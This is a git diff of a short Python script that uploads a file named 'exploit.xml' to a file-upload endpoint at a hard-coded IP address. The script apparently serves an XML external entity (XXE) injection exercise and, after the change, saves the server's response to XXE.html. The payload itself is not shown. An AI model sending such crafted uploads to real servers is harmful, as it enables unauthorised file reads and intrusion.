@@ -1,7 +1,7 @@
 import requests
 
 r = requests.post(
-    'http://43.241.202.47:3003/file-upload',
+    'http://43.241.202.33:3003/file-upload',
     files={
         'file': ('exploit.xml',
                  # https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
@@ -10,4 +10,8 @@ r = requests.post(
 )
 
 print("Status code:", str(r.status_code) + "\n")
-print(r.text)  # TODO save as .html and open Chrome?
+
+with open("XXE.html", "w") as f:
+    f.write(r.text)
+
+print("Saved as XXE.html")
